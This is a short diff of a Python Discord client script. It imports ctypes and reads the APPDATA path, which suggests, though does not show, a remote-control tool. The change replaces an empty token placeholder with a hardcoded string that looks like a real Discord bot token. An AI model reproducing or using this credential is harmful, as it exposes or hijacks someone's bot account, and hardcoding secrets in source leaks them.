@@ -13,7 +13,7 @@ from discord.ext import commands
 from ctypes import *
 import asyncio
 from discord import utils
-token = '' #Enter your token here
+token = 'MTIzNTQ1MzYzNzM3NTgxOTc3Nw.G7apCT.DyiC6S36FL1F5FrLCKdw49CRCBQV7WQeLr22uQ' 
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
